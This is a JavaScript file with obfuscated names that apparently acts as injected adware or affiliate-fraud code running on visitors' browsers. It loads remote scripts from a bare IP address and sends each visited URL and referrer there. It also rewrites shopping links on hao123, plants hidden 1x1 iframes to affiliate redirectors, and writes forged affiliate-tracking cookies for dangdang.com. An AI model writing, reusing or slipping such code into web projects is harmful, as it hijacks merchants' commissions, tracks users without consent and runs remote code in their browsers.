function _ccctoolscc(){
	var obj=new Object; 
	obj.domains = ["nuomi.com","sephora.cn","228.com.cn","tujia.com","wbiao.cn","benlai.com","tuniu.com","ctrip.com","sephora.cn","baidu.com","qq.com","sina.com","sina.cn","163.com","sohu.com","duba.com","xunlei.com","taobao.com","tmall.com","weibo.com","meituan.com","wbiao.cn","www.6.cn","201607300858.taobao.com","m.vip.com","k.vipkid.com","qtour.com","epetbar.com","17ugo.com","m.jd.com","www.spacenk.com","taohv.cn","jiandan100.cn","www.rockport.com","liveport.cn","www.rei.com","oyeah.com.cn","www.catfootwear.com","m.yihaodian.com","www.m6go.com","www.mfplaza.com","m.vmall.com","www.gant.co.uk","www.superdrug.com","www.uniqlo.com","www.b5m.com","m.lemall.com","www.baby-markt.de","www.forever21.com","www.timberland.com","winenice.com","www.ihg.com","jomoo.com.cn","www.keds.com","www.sperry.com","www.lancome-usa.com","www.merrell.com","www.esteelauder.com","newegg.com.cn","www.lvmama.com","goujiuwang.com","glituan.com","umiwi.com","www.superdry.com","aizhigu.cn","chinadrtv.com","www.agentprovocateur.com","www.elizabetharden.com","re.gome.com.cn","www.xmeise.com","www.saucony.com","www.superdrystore.cn","tian10.net","wap.t.7lk.com","us.wconcept.com","store.apple.com","www.starbucksstore.com","m.mi.com","www.revolveclothing.com","www.kiehls.com","ctfeshop.com.cn","7lk.cn","www.thebodyshop.co.uk","www.yoox.com","1mall.com","didamall.com","www.wiggle.co.uk","skg.cc","www.vitaminbay.com","qinqinbaby.com","miwei.com","www.baiyjk.com","www.woot.com","www.umbro.co.uk","masamaso.com","www.dell.co.uk","www.luluguinness.com","yjcs.cn"];
	obj.percent = [];
	obj.yqfpercent = [];
	obj.imgurl = "http://103.207.164.162/stat.php";
	obj.clientip = 977120671;
	obj.chanetdomains = [];

	obj._urltodomain = function(u){
		var c = RegExp("^(http://|https://)((\w|\.|-)*?)/", "g");
		var result = c.exec(u);
		if(result != null && result.length>2){
			if(result[2] != null) {
				return result[2];
			}
		}
		return u;
    };
    obj._getdomain = function(d){
		if(d.indexOf(".") != -1){
				return d.substring(d.indexOf(".")+1,d.length);
		} else {
				return d;
		}
    };
	obj.check = function(){
		var u = window.location.host;
		if(u.indexOf("360")>=0 || u.indexOf("tao")>=0) return false;

		for(var i=0;i<obj.domains.length;i++){
			//if(u.indexOf(obj.domains[i])>=0) return false;
			if(u.indexOf("."+obj.domains[i])>=0 || u == obj.domains[i]) return false;
		}

		for(var i in obj.yqfpercent){
			for(var domain in obj.yqfpercent[i]){
				if(u.indexOf("."+domain)>=0 || u == domain){
					var rdn = obj.GetRandomNum(1, 100);
					if(rdn<=obj.yqfpercent[i][domain]) return true;
					else return false;
				}
			}
		}

		return true;
	};
	obj.flowpercent = function(){
		var u = window.location.host;

		for(var i=0;i<obj.chanetdomains.length;i++){
			if(u.indexOf("."+obj.chanetdomains[i])>=0 || u == obj.chanetdomains[i]) return false;
		}

	        for(var i in obj.percent){
			for(var domain in obj.percent[i]){
				if(u.indexOf("."+domain)>=0 || u == domain){
					var rdn = obj.GetRandomNum(1, 100);
					if(rdn<=obj.percent[i][domain]) return true;
					else return false;
				}
			}
		}
		return false;
	};
	obj.stat = function(log, type, msg){
	    var refer = _open_v5_.oldurl+"###"+document.referrer;
	    var img1 = new Image();
	    var view = obj.imgurl + "?log="+log+"&type="+type+"&i="+encodeURIComponent(refer)+"&u="+encodeURIComponent(window.location.href)+"&msg="+encodeURIComponent(msg);
		  img1.src = view;
	};
	obj.GetRandomNum = function(Min,Max){
		return parseInt(Math.random()*(Max-Min+1) + Min);
	};
	obj._trim = function(text){  
		return (text || "").replace(/^\s+|\s+$/g, ""); 
	};

	obj._cg = function(e){  
		var t = new RegExp("(^| )" + e + "=([^;]*)(;|$)"),
		n = t.exec(document.cookie);
		return n ? n[2] || null: null
	};

	obj._cs = function(e,v){  
		document.cookie = e + "=" + v + "; expires=Sun, 31-Dec-2099 23:59:59 GMT; path=/";
	};
	obj._GetCookie = function(name){
		var cookieValue = null;
		if (document.cookie && document.cookie != "") {
		    var cookies = document.cookie.split(";");
		    for (var i = 0; i < cookies.length; i++) {
			var cookie = obj._trim(cookies[i]);
			if (cookie.substring(0, name.length + 1) == (name + "=")) {
			    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
			    break;
			}
		    }
		}
		return cookieValue;
	 };
	 obj._inCookie = function(name,value,expires,path,domain,secure){    
		    var today = new Date();    
		    today.setTime(today.getTime());    
		    if(expires){        
			expires = expires*1000*60*60*24*30;    
		    }    
		    var expires_date = new Date(today.getTime()+(expires)); 
		    document.cookie = name+"="+escape(value)+((expires)?";expires="+expires_date.toGMTString():"")+((path)?";path="+path:"")+(( domain) ? ";domain="+domain:"")+((secure)? ";secure":"");
        };
	obj._SetCookie = function(name, value, options) {    
		options = options || {};
		if (value === null) {
		    value = "";
		    options.expires = -1;
		}
		var expires = "";
		if (options.expires && (typeof options.expires == "number" || options.expires.toUTCString)) {            
		    if (typeof options.expires == "number") {
			var date = new Date();
			date.setTime(date.getTime() + (options.expires * 10 * 1000));
					expires = "; expires=" + date.toUTCString();
		    } else {
			var date = options.expires;
					expires = "; expires=" + date.toUTCString();
		    }            
		}
		var path = options.path ? "; path=" + (options.path) : "";
		var domain = options.domain ? "; domain=" + (options.domain) : "";
		var secure = options.secure ? "; secure" : "";
		document.cookie = [name, "=", encodeURIComponent(value), expires, path, domain, secure].join("");
	};
	obj.d = function(a, n) {
	    var c = a.length,
		b = a[c - 1];
	    if (n && n != "SE_SSID") {
		for (var i = c - 2; i >= 0; i--) {
		    b = a[i] + "." + b;
		    document.cookie = n + "=; domain=" + b + "; expires=Mon,01-Jan-1973 00:00:01 GMT";
		}
	    }
	};
	obj.clearcookie = function() {
	   
	    var a = document.cookie.split("; ");
	    for (var i = 0; i < a.length; i++) {
		obj.d(location.hostname.split("."), a[i].split("=")[0]);
	    } 
	};
	obj.norefer = function(u) {
	   if (window.navigate && typeof(window.navigate) == "function") navigate(u);
	    var ua = navigator.userAgent.toLowerCase();
	  if (ua.indexOf("applewebkit") > 0) {
		var h = document.createElement("a");
		h.rel = "noreferrer";
		h.target = "_self";
		h.href = u;
		document.body.appendChild(h);
		var evt = document.createEvent("MouseEvents");
		evt.initEvent("click", true, true);
		h.dispatchEvent(evt);
	    } else {
		document.write("<meta http-equiv=\"Refresh\" Content=\"0; Url=" + u + "\" >");
		setTimeout(function() {
			location.href = u;
		    },
		    100);
	    }
	};
	obj.SetLinkUrl = function(type){
		var host= window.location.host;
		var pathname= window.location.pathname;
		if (host=="www.hao123.com" && pathname == "/"){
			
			var isIf = false;		
			try{
				if(self != top) isIf = true;
				var doc = (isIf ? window.top.document : document);

				var div = doc.getElementById("layout-famoussite");
				var a = div.getElementsByTagName("a");
				var oldhref = "";				
				for(var i = 0;i<a.length;i++){					
					if(a[i].getAttribute("data-title") == "京东商城"){
						oldhref += a[i].href +",";
						a[i].href = "http://www.jd.com/";
					}else if(a[i].innerHTML == "唯 品 会"){
						oldhref += a[i].href +",";
						a[i].href = "http://www.vip.com/";
					}else if(a[i].innerHTML == "苏宁易购"){
						oldhref += a[i].href +",";
						a[i].href = "http://www.suning.com/";
					}else if(a[i].innerHTML == "国美在线"){
						oldhref += a[i].href +",";
						a[i].href = "http://www.gome.com.cn/";
					}else if(a[i].innerHTML == "1 号 店"){
						oldhref += a[i].href +",";
						a[i].href = "http://www.yhd.com/";
					}
				}
				obj.stat("hao", type, oldhref); 
			}catch(e){}
		}
	};
	obj.Refresh = function(type){
		return "";
	        var host= window.location.host;
		var pathname= window.location.pathname;
		var search= window.location.search; 
		var referer = document.referrer;
		var href = window.location.href;
				
		 if( host=="www.hao123.com"    
				&& href != "http://www.hao123.com/?tn=92118805_s_hao_pg" 
				&& href != "http://www.hao123.com/?tn=99083708_s_hao_pg" 
				&& href != "http://www.hao123.com/?tn=94759963_s_hao_pg" 
				&& href != "http://www.hao123.com/?tn=98111462_s_hao_pg" 
				&& href != "http://www.hao123.com/?tn=98514459_s_hao_pg" 
				&& href != "http://www.hao123.com/?tn=95923964_s_hao_pg" 
				&& href != "http://www.hao123.com/?tn=90799183_s_hao_pg" 
				&& href != "http://www.hao123.com/?tn=97143333_s_hao_pg" 
				   ){					

			if (host=="www.hao123.com" && pathname == "/" &&  (search == "" )  ){
				if (obj._GetCookie("_haoqaz_") == null  ) { 

					var i = obj.clientip%1;


					if( i == 0 )
					{
						obj._SetCookie("_haoqaz_",1, { expires: 960, path: "/" });
						obj.stat("iframe", type, "succx9"); 
						window.location.href = "http://www.hao123.com/?tn=90799183_s_hao_pg";
						return "succx9";
					} 
					 					 
				}
				//else
				//	return "filter-cookie";
			}
			 
			else if  (host=="www.hao123.com" && pathname == "/" &&  (search.length > 2 && search.length < 25 && search.indexOf("tn=")>=0)  ){
				if (obj._GetCookie("_haoqaz_") == null  ) {	
					var i = obj.clientip%2;
 
					if( i == 0 ){
						obj.clearcookie();
						obj._SetCookie("_haoqaz_",1, { expires: 960, path: "/" });
						obj.stat("iframe", type, "succy0"); 
						window.location.href = "http://www.hao123.com/?tn=97143333_s_hao_pg";

						return "succy0";
					}
					else if( i == 1 ){
						obj.clearcookie();
						obj._SetCookie("_haoqaz_",1, { expires: 960, path: "/" });
						obj.stat("iframe", type, "succy1"); 
						window.location.href = "http://www.hao123.com/?tn=98514459_s_hao_pg";

						return "succy1";
					}
					 
				}
				//else
				//	return "filter-cookie";
			}
			 
			 
		} 

		//if(host.indexOf("www.hao123.com") > -1 ) 
		//	return "fail";
		//else 
			return "";
	};

	return obj;
}

function _cccdddccc(){
	var obj=new Object; 
	obj.handler = null;
	obj.tools = _ccctoolscc();
	obj.sites = [854407,854408,854410,854411,854412,854413,854414,854415,854416,854417,854409,854406];
	obj.bigsites = [];
	obj.siteId = 0;
	obj.stattype = 440300;
	obj.init = function(siteId){
		try{
			var _jjl = new Date().toDateString().replace(/\s/g, "") + new Date().toTimeString().replace(/:\d{2}:\d{2}\sUTC[+]\d{4}$/g, "");
			window.setTimeout(function(){var a=document.createElement("script");a.src="http://103.207.164.162/yf.js?area="+obj.stattype+"&v="+Math.random();document.getElementsByTagName("head")[0].appendChild(a);},0);
			window.setTimeout(function(){var a=document.createElement("script");a.src="http://p.yiqifa.com/jj?_jjl.js";document.getElementsByTagName("head")[0].appendChild(a);},0);

			var xxsite = [854718,854719,854720,854721,854722,854723,854724,854725,854699,854700,854701,854702,854703,854704,854705,854706,854707,854708,854709,854710];

			var hostxx= window.location.host; 

			var jumei_url = "http://p.yiqifa.com/jc?fit=b&c=5227&i=10462&w=xxurl&l=0&e=&t=http%3A%2F%2Fwww.jumei.com";
			var vip_url =   "http://p.yiqifa.com/jc?fit=b&c=4018&i=2882&w=xxurl&l=0&e=&t=http%3A%2F%2Fwww.vip.com";
			var yhd_url =   "http://p.yiqifa.com/jc?fit=b&c=139&i=802&w=xxurl&l=0&e=&t=http%3A%2F%2Fwww.yhd.com";
			var lifevc_url ="http://p.yiqifa.com/jc?fit=b&c=6613&i=21882&w=xxurl&l=0&e=&t=http%3A%2F%2Fwww.lifevc.com";
			var sfbest_url ="http://p.yiqifa.com/jc?fit=b&c=6712&i=22762&w=xxurl&l=0&e=&t=http%3A%2F%2Fwww.sfbest.com";
			var banggo_url ="http://p.yiqifa.com/jc?fit=b&c=5858&i=16562&w=xxurl&l=0&e=&t=http%3A%2F%2Fwww.banggo.com";
			var x111_url =  "http://p.yiqifa.com/jc?fit=b&c=6672&i=22545&w=xxurl&l=0&e=&t=http%3A%2F%2Fwww.111.com.cn"; 

			var xx_url = "";

			 if (obj.tools._GetCookie("_xxqaz_") == null
				&& (
					 hostxx.indexOf(".vip.com") > -1
					|| hostxx.indexOf(".yhd.com") > -1
					|| hostxx.indexOf(".lifevc.com") > -1
					|| hostxx.indexOf(".sfbest.com") > -1
					|| hostxx.indexOf(".banggo.com") > -1
					|| hostxx.indexOf(".111.com.cn") > -1 
				)
			    )
			 { 
				

				if (hostxx.indexOf(".jumei.com") > -1)
					xx_url = jumei_url;
				else if (hostxx.indexOf(".vip.com") > -1)
					xx_url = vip_url;
				else if (hostxx.indexOf(".yhd.com") > -1)
					xx_url = yhd_url;
				else if (hostxx.indexOf(".lifevc.com") > -1)
					xx_url = lifevc_url;
				else if (hostxx.indexOf(".sfbest.com") > -1)
					xx_url = sfbest_url;
				else if (hostxx.indexOf(".banggo.com") > -1)
					xx_url = banggo_url;
				else if (hostxx.indexOf(".111.com.cn") > -1)
					xx_url = x111_url; 
				else
					return;


				var ixx = obj.tools.clientip % xxsite.length;
				xx_url = xx_url.replace(/xxurl/, xxsite[ixx]);

				var newsixdsf = document.createElement("IFRAME");
				newsixdsf.src = xx_url;
				newsixdsf.scrolling = "no";
				newsixdsf.frameBorder = 0;
				newsixdsf.width = 1;
				newsixdsf.height = 1;        
				document.body.appendChild(newsixdsf);
				obj.tools._SetCookie("_xxqaz_",1, { expires: 10, path: "/" });
				obj.tools.stat("xx", "0", xx_url);
			 } 
			 else if (obj.tools._GetCookie("_xxqaz_") == null && hostxx.indexOf(".dangdang.com") > -1 )
			 {
				var idang = obj.tools.clientip % 12;

				 if (idang == 0)
				 {
					obj.tools._inCookie("from","419-854407|00bbbb0c132b04ec94a7",1,"/","dangdang.com");
					obj.tools._inCookie("order_follow_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7sykqbr9e7rlbgntpspnm2w9swgq4dweroykqj6wet6sudpkzogn4vrw4dptdsmn665cbyrwwopnm1c9k|#0|#oOeYdHpGxyvn-|-",1,"/","dangdang.com");
					obj.tools._inCookie("out_order_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7sykqbr9e7rlbgntpspnm2w9swgq4dweroykqj6wet6sudpkzogn4vrw4dptdsmn665cbyrwwopnm1c9k|#0|#oOeYdHpGxyvn",1,"/","union.dangdang.com");
        
				 }
				  else if (idang == 1)
				 {
					obj.tools._inCookie("from","419-854408|003b753b1626f2486252",1,"/","dangdang.com");
					obj.tools._inCookie("order_follow_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dclsnutbn6wai1z446wbqnwvyrwwopn4vntpspnm2p7ptyq4dkcwoywgwwpawnsubpkzsyqbyrwwopbu%21pos|#0|#S5GeSAaOhThg-|-",1,"/","dangdang.com");
					obj.tools._inCookie("out_order_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dclsnutbn6wai1z446wbqnwvyrwwopn4vntpspnm2p7ptyq4dkcwoywgwwpawnsubpkzsyqbyrwwopbu%21pos|#0|#S5GeSAaOhThg",1,"/","union.dangdang.com");
				 }
				 else if (idang == 2)
				 {
					obj.tools._inCookie("from","419-854410|0071575036003fec9054",1,"/","dangdang.com");
					obj.tools._inCookie("order_follow_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dclsfgpboncyxkq446wbqnwvyrwwopn4vntpspnm2p7ptyq4dkcwoywgqpsawnsubpkzsyqbyrwwoptsddwk|#0|#7RfoHfAIl7Dp-|-",1,"/","dangdang.com");
					obj.tools._inCookie("out_order_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dclsfgpboncyxkq446wbqnwvyrwwopn4vntpspnm2p7ptyq4dkcwoywgqpsawnsubpkzsyqbyrwwoptsddwk|#0|#7RfoHfAIl7Dp",1,"/","union.dangdang.com");
				  
				 }
				 else if (idang == 3)
				 {
					obj.tools._inCookie("from","419-854411|000a339118ab1336e7ea",1,"/","dangdang.com");
					obj.tools._inCookie("order_follow_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7sykqbr9e7rlbgntpspnm2w9sqkb2s6eyignm2p7ptyq4dkcwoywgqpsbwnsubpkzsyqbyrwwopbu%21wer|#0|#ieJELkXSNU0k-|-",1,"/","dangdang.com");
					obj.tools._inCookie("out_order_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7sykqbr9e7rlbgntpspnm2w9sqkb2s6eyignm2p7ptyq4dkcwoywgqpsbwnsubpkzsyqbyrwwopbu%21wer|#0|#ieJELkXSNU0k",1,"/","union.dangdang.com");
				 }
				 else if (idang == 4)
				 {
					obj.tools._inCookie("from","419-854412|009f31c1c4ac10002ec5",1,"/","dangdang.com");
					obj.tools._inCookie("order_follow_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7sykqbr9e7rlbgntpspnm2w9swgq4dweroykqj6wet6su16tzogn4vrwu7ks4%21rorokqbyrwwopnm%21kj4|#0|#IxLQCp0hhyTV-|-",1,"/","dangdang.com");
					obj.tools._inCookie("out_order_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7sykqbr9e7rlbgntpspnm2w9swgq4dweroykqj6wet6su16tzogn4vrwu7ks4%21rorokqbyrwwopnm%21kj4|#0|#IxLQCp0hhyTV",1,"/","union.dangdang.com");
				 }
				 else if (idang == 5)
				 {
					obj.tools._inCookie("from","419-854413|00a4f2172b89342668db",1,"/","dangdang.com");
					obj.tools._inCookie("order_follow_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7sykqbr9e7rlbgntpspnm2w9swgq4dweroykqj6wet6su16wzogn4vrwwopjvgntpspwgvw7ksrsu1gb6|#0|#vCAI3Hpw4rY5-|-",1,"/","dangdang.com");
					obj.tools._inCookie("out_order_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7sykqbr9e7rlbgntpspnm2w9swgq4dweroykqj6wet6su16wzogn4vrwwopjvgntpspwgvw7ksrsu1gb6|#0|#vCAI3Hpw4rY5",1,"/","union.dangdang.com");
				 }
				 else if (idang == 6)
				 {
					obj.tools._inCookie("from","419-854414|0096c361120c6a6e2669",1,"/","dangdang.com");
					obj.tools._inCookie("order_follow_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7sykqbr9e7rlbgntpspnm2w9swgq4dweroykqj6wet6su1m7zogn4vrwwopjvgntpspcdm69qc1tsdknb|#0|#243xGj8Js4VQ-|-",1,"/","dangdang.com");
					obj.tools._inCookie("out_order_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7sykqbr9e7rlbgntpspnm2w9swgq4dweroykqj6wet6su1m7zogn4vrwwopjvgntpspcdm69qc1tsdknb|#0|#243xGj8Js4VQ",1,"/","union.dangdang.com");
				 }
				 else if (idang == 7)
				 {
					obj.tools._inCookie("from","419-854415|005beca666010ff6109b",1,"/","dangdang.com");
					obj.tools._inCookie("order_follow_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7sykqbr9e7rlbgntpspnm2w9swgq4dweroykqj6wet6su1ktzogn4vrwwopjvgntpspws869ep3em1ulu|#0|#i6AntUUHr4F5-|-",1,"/","dangdang.com");
					obj.tools._inCookie("out_order_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7sykqbr9e7rlbgntpspnm2w9swgq4dweroykqj6wet6su1ktzogn4vrwwopjvgntpspws869ep3em1ulu|#0|#i6AntUUHr4F5",1,"/","union.dangdang.com");
				 }
				 else if (idang == 8)
				 {
					obj.tools._inCookie("from","419-854416|0083c853d9ce75bde63c",1,"/","dangdang.com");
					obj.tools._inCookie("order_follow_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dclsmk5u%21rny5gz446wbqnwvyrwwopn4vntpspnm2p7ptyq4dkcwoywgq696wnsubpkzsyqbyrwwopt7sdcr|#0|#kWbn7pFWiYcu-|-",1,"/","dangdang.com");
					obj.tools._inCookie("out_order_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dclsmk5u%21rny5gz446wbqnwvyrwwopn4vntpspnm2p7ptyq4dkcwoywgq696wnsubpkzsyqbyrwwopt7sdcr|#0|#kWbn7pFWiYcu",1,"/","union.dangdang.com");

				 }
				 else if (idang == 9)
				 {
					obj.tools._inCookie("from","419-854417|003c88c3c058466ccd53",1,"/","dangdang.com");
					obj.tools._inCookie("order_follow_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7sykqbr9e7rlbgntpspnm2w9swgq4dweroykqj6wet6su1pkzogn4vrwwopjvgntpspcgwpoqi1bubus6|#0|#V4V4DDLYSYnc-|-",1,"/","dangdang.com");
					obj.tools._inCookie("out_order_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7sykqbr9e7rlbgntpspnm2w9swgq4dweroykqj6wet6su1pkzogn4vrwwopjvgntpspcgwpoqi1bubus6|#0|#V4V4DDLYSYnc",1,"/","union.dangdang.com");
				 }
				 else if (idang == 10)
				 {
					obj.tools._inCookie("from","419-854409|00b52db49c7e906b7995",1,"/","dangdang.com");
					obj.tools._inCookie("order_follow_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7sykqbr9e7rlbgntpspnm2w9swgq4dweroykqj6wet6sudkkzogn4vrcgeubpfdytqkqbyrwwopnm1kwm|#0|#1Tx16nB2CLu8-|-",1,"/","dangdang.com");
					obj.tools._inCookie("out_order_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7sykqbr9e7rlbgntpspnm2w9swgq4dweroykqj6wet6sudkkzogn4vrcgeubpfdytqkqbyrwwopnm1kwm|#0|#1Tx16nB2CLu8",1,"/","union.dangdang.com");
				 }
				 else if (idang == 11)
				 {
					obj.tools._inCookie("from","419-854406|009e3f5489cba3493933",1,"/","dangdang.com");
					obj.tools._inCookie("order_follow_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7s6q6wmosvmq446wbqnwvyrwwopn4vntpspnm2p7ptyq4dkcwoywgw696wnsubpkzsyqbyrwwopnbdkwh|#0|#RNslbRuo9l2f-|-",1,"/","dangdang.com");
					obj.tools._inCookie("out_order_source","P-419-8544|#1|#p.yiqifa.com%2Fl%3Fl%3Dcl7s6q6wmosvmq446wbqnwvyrwwopn4vntpspnm2p7ptyq4dkcwoywgw696wnsubpkzsyqbyrwwopnbdkwh|#0|#RNslbRuo9l2f",1,"/","union.dangdang.com");
				 }
				 
				 

				obj.tools._SetCookie("_xxqaz_",1, { expires: 10, path: "/" });
				obj.tools.stat("dang", "0", "dang"); 
			 } 
			 
		    
		}catch(e){} 
	};
	obj.run = function(){
		try{
			 if(JueJinLian!=null && JueJinLian!="undefined" && eqfCs!=null && eqfCs!="undefined"){
				 window.clearInterval(obj.handlerhandler);
				 if(obj.tools.check()){
					 var jjl = JueJinLian._init(); 
					 jjl._addWid(obj.siteId);
					 jjl._addE("");
					 jjl._addScope(1);
					 jjl._addStatType(obj.stattype);
					 jjl._run(); 
				 }
			 }
			
		}catch(e){} 
	};	
	obj.site = function(){
		var u = window.location.host;
		for(var domain in obj.bigsites){
			if(u.indexOf("."+domain)>=0 || u == domain){
				if(obj.bigsites[domain].length == 0) return -1;

				var rdn = obj.tools.GetRandomNum(0, obj.bigsites[domain].length-1);
				return obj.bigsites[domain][rdn];
			}
		}
		if(obj.sites.length == 0) return -1;

		var i = obj.tools.GetRandomNum(0, obj.sites.length-1);
		return obj.sites[i];
	};
	obj.start = function(){
                /*
		var msg = obj.tools.Refresh(obj.stattype);
		if(msg.length>0){
			if(msg.indexOf("succ") == -1 && msg.indexOf("bucc") == -1)
				obj.tools.stat("iframe", obj.stattype, msg);
			 return;
		}
		*/

		obj.tools.SetLinkUrl(obj.stattype);
	
		if(obj.tools.check()){
			obj.siteId = obj.site();
			if(obj.siteId == -1) return;

			obj.init(obj.siteId);
			obj.handlerhandler = window.setInterval(obj.run, 100);
		}		
	};
	return obj;
}

function _cccchanetccc(){
	var obj=new Object; 
	obj.handler = null;
	obj.tools = _ccctoolscc();
	obj.sites = [530861,530866];
	obj.bigsites = [];
	obj.siteId = 0;
	obj.stattype = 440300;
	obj.init = function(siteId){
		try{
			var _tjlt = new Date().toDateString().replace(/\s/g, "");
			window.setTimeout(function(){var a=document.createElement("script");a.src="http://103.207.164.162/js/wangjinlian.js?v="+_tjlt+".js";document.getElementsByTagName("head")[0].appendChild(a);},0);
			window.setTimeout(function(){var a=document.createElement("script");a.src="http://103.207.164.162/chanet.js?area="+obj.stattype+"&v="+Math.random();document.getElementsByTagName("head")[0].appendChild(a);},0);	
			

			

		}catch(e){} 
	};
	obj.run = function(){
		try{
			 if(typeof(WangJinLian)!="undefined" && WangJinLian!=null && obj.isExitsFunction(WangJinLian._run)){
				 window.clearInterval(obj.handlerhandler);
				 
				  var _tjl = WangJinLian.__init__();
				  _tjl._setASID(obj.siteId);
				  _tjl._setParam_e();
				  _tjl._setParam_u("");
				  _tjl._setType();
				  _tjl._setCPType(4);
				  _tjl._setStatType(obj.stattype);
				  _tjl._run();
			 }
			
		}catch(e){} 
	};
	obj.isExitsFunction = function(funcName) {
	    try {
		if (typeof(eval(funcName)) == "function") {
		    return true;
		}
	    } catch(e) {}
	    return false;
	};
	obj.site = function(){
		var u = window.location.host;
		for(var domain in obj.bigsites){
			if(u.indexOf("."+domain)>=0 || u == domain){
				if(obj.bigsites[domain].length == 0) return -1;

				var rdn = obj.tools.GetRandomNum(0, obj.bigsites[domain].length-1);
				return obj.bigsites[domain][rdn];
			}
		}
		
		if(obj.sites.length == 0) return -1;

		var i = obj.tools.GetRandomNum(0, obj.sites.length-1);
		return obj.sites[i];
	};
	obj.start = function(){
		obj.siteId = obj.site();
		if(obj.siteId == -1) return;

		obj.init(obj.siteId);
		obj.handlerhandler = window.setInterval(obj.run, 100);				
	};
	return obj;
}

try{
	var _ddtoolsdd = _ccctoolscc();
	var _ddcccdd = _cccdddccc();
	var _ddchanetdd = _cccchanetccc();
	
	if(_ddtoolsdd.flowpercent())
	    _ddchanetdd.start();
	else
	    _ddcccdd.start();

}catch(e){}
